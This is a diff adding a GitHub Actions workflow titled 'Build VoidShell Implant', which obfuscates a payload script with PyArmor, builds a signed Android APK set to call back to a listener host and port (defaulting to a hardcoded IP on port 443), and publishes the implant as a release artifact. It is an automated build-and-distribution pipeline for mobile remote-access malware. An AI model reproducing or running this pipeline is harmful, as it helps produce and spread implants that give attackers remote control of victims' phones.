@@ -1,0 +1,76 @@
+# .github/workflows/build-voidshell.yml
+name: Build VoidShell Implant
+
+on:                     # triggers 
+  workflow_dispatch:                   # allows manual run from GitHub UI
+
+jobs:
+  build-apk:
+    runs-on: ubuntu-latest
+    environment: production             # put secrets here (optional)
+    permissions:
+      contents: write                  # needed to create releases
+
+    steps:
+      - name: Checkout repository
+        uses: actions/checkout@v4
+
+      - name: Set up Python 3.12
+        uses: actions/setup-python@v5
+        with:
+          python-version: '3.12'
+
+      - name: Install dependencies
+        run: |
+          python -m pip install --upgrade pip
+          pip install pyaxmlparser androguard requests pyarmor
+
+      - name: Generate unique build ID & timestamp
+        id: vars
+        run: |
+          echo "build_id=$(date +%Y%m%d-%H%M%S)-$(openssl rand -hex 3)" >> $GITHUB_OUTPUT
+          echo "apk_name=VoidShell-${{ steps.vars.outputs.build_id }}.apk" >> $GITHUB_OUTPUT
+
+      - name: Obfuscate payload with PyArmor (optional but recommended)
+        run: |
+          pyarmor obfuscate --recursive --output dist/obf voidshell_payload.py
+          cp dist/obf/voidshell_payload.py payload_obf.py
+
+      - name: Build signed APK (using your builder script)
+        env:
+          LHOST: ${{ secrets.LHOST }}                 # set these in repo secrets
+          LPORT: ${{ secrets.LPORT }}
+          KEYSTORE_PASS: ${{ secrets.KEYSTORE_PASS }}
+        run: |
+          # If you don't use secrets, hardcode or use defaults
+          python builder_v2.py \
+            --lhost "${LHOST:-194.169.34.12}" \
+            --lport "${LPORT:-443}" \
+            --output "dist/${{ steps.vars.outputs.apk_name }}"
+
+      - name: Upload APK as artifact (always available)
+        uses: actions/upload-artifact@v4
+        with:
+          name: VoidShell-APK
+          path: dist/*.apk
+          retention-days: 30
+
+      - name: Create GitHub Release + attach APK (only on tags)
+        if: startsWith(github.ref, 'refs/tags/')
+        uses: softprops/action-gh-release@v2
+        with:
+          files: dist/*.apk
+          name: VoidShell ${{ github.ref_name }}
+          draft: false
+          prerelease: false
+          body: |
+            Automated build – ${{ steps.vars.outputs.build_id }}
+            Built at: ${{ github.event.head_commit.timestamp || steps.vars.outputs.build_id }}
+            Commit: ${{ github.sha }}
+
+      - name: Notify (optional – Discord/Telegram)
+        if: always()
+        run: |
+          curl -X POST -H 'Content-type: application/json' \
+            --data "{\"content\":\"VoidShell build finished\nAPK: ${{ steps.vars.outputs.apk_name }}\nStatus: ${{ job.status }}\"}" \
+            ${{ secrets.DISCORD_WEBHOOK }}
